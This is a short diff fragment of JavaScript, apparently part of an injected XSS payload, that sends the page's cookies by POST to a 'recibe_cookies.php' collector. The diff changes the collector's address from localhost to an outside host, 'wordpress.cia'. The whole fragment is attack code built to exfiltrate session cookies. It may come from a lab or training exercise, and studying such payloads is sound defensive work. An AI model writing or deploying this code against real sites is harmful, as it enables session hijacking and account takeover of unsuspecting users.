@@ -14,7 +14,7 @@
        console.log("Error de red o el endpoint no está accesible.");
     };
 
-    xhr.open("POST", "http://localhost/recibe_cookies.php", true);
+    xhr.open("POST", "http://wordpress.cia/recibe_cookies.php", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("cookies=" + encodeURIComponent(cookies));
 })();
